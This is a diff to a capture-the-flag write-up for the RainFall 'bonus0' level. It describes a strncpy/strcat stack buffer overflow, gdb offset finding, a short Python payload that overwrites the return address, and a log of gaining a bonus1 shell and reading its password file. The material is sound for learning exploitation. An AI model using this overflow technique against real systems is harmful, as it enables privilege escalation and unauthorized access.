@@ -1,10 +1,48 @@
 # Vulnerability
-Multiple `strcpy()` calls without bounds checking.
 
-# Key Points
-- Read input twice with `read()`
-- Copies to local buffers with `strcpy()`
-- Concatenates strings causing overflow
+strncpy() doesn't null-terminate if source is exactly 20 bytes
+strcpy() and strcat() copy without bounds checking
+Off-by-one when adding space character
 
-# Exploit
-Buffer overflow to overwrite return address with shellcode in environment.
+# Stack Layout
+[buffer: 54 bytes][saved ebp][return address]
+
+
+# Exploitation Strategy
+Input exactly 20 bytes (no null terminator) for both inputs to trigger overflow.
+
+# Finding Offset
+bash(gdb) run
+ - 
+AAAAAAAAAAAAAAAAAAAA
+ - 
+BBBBBBBBBBBBBBBBBBBB
+(gdb) x/20wx $esp
+(Check where return address is overwritten)
+
+
+# Exploitation
+#!/usr/bin/env python
+
+(Both inputs: exactly 20 bytes (no null terminator))
+input1 = "A" * 20
+input2 = "B" * 9 + "\x08\x04\x84\x44"  # Adjust address
+
+print input1 + "\n" + input2
+
+# Execution
+bashbonus0@RainFall:~$ (python exploit.py; cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAA BBBBBBBBB�D
+$ whoami
+bonus1
+$ cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
+# Key Concepts
+Off-by-one error
+String concatenation overflow
+strncpy() no null terminator
+Multiple vulnerability combination
